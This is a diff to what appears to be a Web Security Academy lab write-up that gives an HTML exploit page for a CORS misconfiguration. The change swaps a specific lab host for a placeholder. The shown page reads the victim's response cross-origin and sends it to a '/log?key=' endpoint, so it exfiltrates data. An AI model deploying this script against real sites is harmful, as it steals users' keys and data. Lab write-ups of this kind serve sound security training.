@@ -53,7 +53,9 @@ Html script for exploiting CORS:
         <h1>Hello World!</h1>
         <script>
             var xhr = new XMLHttpRequest();
-            var url = "https://0acf00c80446860280902124001f00f0.web-security-academy.net"
+            
+            var url = "YOUR-LAB-ID.web-security-academy.net"
+            
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == XMLHttpRequest.DONE){
                     fetch("/log?key=" + xhr.responseText)
@@ -67,3 +69,5 @@ Html script for exploiting CORS:
     </body>
 </html>
 ```
+
+
